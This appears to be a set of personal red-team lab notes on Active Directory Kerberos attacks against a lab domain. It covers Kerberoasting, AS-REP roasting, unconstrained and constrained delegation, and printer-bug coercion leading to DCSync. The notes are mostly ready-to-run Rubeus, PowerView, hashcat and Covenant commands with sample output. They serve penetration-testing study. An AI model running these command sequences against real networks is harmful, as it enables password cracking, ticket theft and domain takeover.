![[Pasted image 20210703183206.png]]

## Kereroasting
Services run on a machine under the context of a user account. These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. DOMAIN\mssql).

A Service Principal Name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.

***Kerberoasting is a technique for requesting TGS’s for services run under the context of domain accounts and cracking them offline to reveal their plaintext password.***

Find user accounts with non-null SPNs with PowerView/SharpView:
```
> PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
```

We can also find users to kerberoast in BloodHound with this Cypher query:
```
MATCH (u:User {hasspn:true}) RETURN u
```

Kerberoast all the users in the domain with **Rubeus kerberoast**.
```
> Rubeus kerberoast
```


Crack with hashcat:
```
hashcat -a 0 -m 13100 kerberoast-hashes /usr/share/wordlists/rockyou.txt
```

## ASREPRoasting
If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user and part of the message can be cracked offline to recover their plaintext password.

Covenant/PowerView command:
```
> PowerShell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
```

ASREPRoast all users in the domain with **Rubeus asreproast**.
```
> Rubeus asreproast /format:hashcat
```

## Unconstrained Delegation
An interesting aspect to Unconstrained Delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached.

If we can compromise a machine with Unconstrained Delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

```
#Find unconstrained delegation
> PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName

#Rubeus dump will extract these tickets from memory and output them as base64 strings. Dump all tickets in a specific LUID: Rubeus dump /luid:0x1fdf42b.

> Rubeus dump /service:krbtgt
> Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
> ImpersonateProcess 2768

> PowerShellRemotingGrunt dc-1 PowerShell
> Connect dc-1 rastasvc
```

#### Exploit PrintSpool
PoC: https://github.com/leechristensen/SpoolSample

```
> shell dir \\dc01\pipe\spoolss ####attempt to access the named pipe
with the dir command

> Shell C:\Temp\SpoolSample.exe dc-1.cyberbotic.io web-1.cyberbotic.io

> Assembly /assemblyname:"Rubeus" /parameters:"dump /service:krbtgt"

> MakeToken Administrator CYBER DoesNotMatter

> DCSync CYBER\krbtgt
```

## Constrained Delegation
Find all computers configured for constrained delegation and what they're allowed to delegate to.
```
> PowerShell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
```

 it’s the computer account trusted for delegation, we need either the NTLM hash for the computer account, or a valid TGT for this abuse to work. As local admin on the machine, we can retrieve the NTLM hash using Mimikatz or extract the TGT with Rubeus.
 
 ```
 > Rubeus dump /service:krbtgt
 
 ```
 
 Now with the TGT, run Rubeus s4u:
 
 ```
 > Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
 ```
 
 This final ticket can be used with Rubeus ptt.

```
> Rubeus createnetonly /program:C:\Windows\System32\cmd.exe

[+] ProcessID : 3420
[+] LUID : 0x239b995

> Rubeus ptt /luid:0x239b995 /ticket:[...snip...]

[*] Action: Import Ticket
[*] Target LUID: 0x239b995
[+] Ticket successfully imported!


> ImpersonateProcess 3420

Successfully impersonated: 3420


> ls \\fs-1.cyberbotic.io\c$

Name                                               Length     CreationTimeUtc      LastAccessTimeUtc    LastWriteTimeUtc
----                                               ------     ---------------      -----------------    ----------------
\\fs-1.cyberbotic.io\c$\$Recycle.Bin               0          16/07/2016 13:23:21  06/03/2020 20:08:47  06/03/2020 20:08:47
\\fs-1.cyberbotic.io\c$\Documents and Settings     0          06/03/2020 20:07:01  06/03/2020 20:07:01  06/03/2020 20:07:01